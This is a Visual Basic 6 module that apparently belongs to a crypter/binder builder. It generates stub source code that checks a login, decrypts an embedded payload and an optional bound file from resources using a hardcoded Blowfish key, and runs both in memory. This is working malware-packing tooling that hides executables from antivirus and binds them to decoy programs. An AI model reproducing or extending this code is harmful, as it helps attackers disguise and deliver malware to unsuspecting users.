Attribute VB_Name = "mMainModule"
Public Const X = """"
Public Function MainModule() As String
MainModule = MainModule & "Attribute VB_Name = " & X & f.Text1(2).Text & X & vbCrLf & vbNewLine
MainModule = MainModule & "Option Explicit" & vbCrLf & _
"Public Sub Main()" & vbCrLf & _
"Dim mFile() As Byte" & vbCrLf & _
"Dim mBind() As Byte" & vbCrLf & _
"Dim mKeyStore() As Byte" & vbCrLf & _
"Dim sKeyStore As String" & vbCrLf & _
"Dim c as New clsBlowfish" & vbCrLf & _
"If CheckUser(" & X & f.Text3.Text & X & ", " & X & f.Text4.Text & X & ") = False Then" & vbCrLf & _
"End" & vbCrLf & _
"Else" & vbCrLf & _
"c.Key = " & X & "££!asd12!£as-jH£$%%£I£($_GHJ(*&^%RGHJ%££(£_($£" & X & vbCrLf & _
"mFile = GetResDataBytes(1, 5000)" & vbCrLf & _
"mKeyStore = GetResDataBytes(1, 5001)" & vbCrLf & _
"mBind = GetResDataBytes(1, 5002)" & vbCrLf & _
"sKeyStore = ByteArrayToString(mKeyStore())" & vbCrLf & _
"c.DecryptByte mFile, sKeyStore" & vbCrLf & _
"If mBind <> "" Then" & vbCrLf & _
"c.DecryptByte mBind, sKeyStore" & vbCrLf & _
"End if" & vbCrLf & _
"If mBind <> "" Then" & vbCrLf & _
"Call RunExe(AppExe, mBind)" & vbCrLf & _
"End if" & vbCrLf & _
"Call RunExe(AppExe, mFile)" & vbCrLf & _
"End If" & vbCrLf & _
"End Sub" & vbCrLf & vbNewLine
MainModule = MainModule & "Public Function ByteArrayToString(bytArray() As Byte) As String" & vbCrLf & _
"    Dim sAns As String" & vbCrLf & _
"    Dim iPos As String" & vbCrLf & _
"    sAns = StrConv(bytArray, vbUnicode)" & vbCrLf & _
"    iPos = InStr(sAns, Chr(0))" & vbCrLf & _
"    If iPos > 0 Then sAns = Left(sAns, iPos - 1)" & vbCrLf & _
"    ByteArrayToString = sAns" & vbCrLf & _
" End Function"


End Function



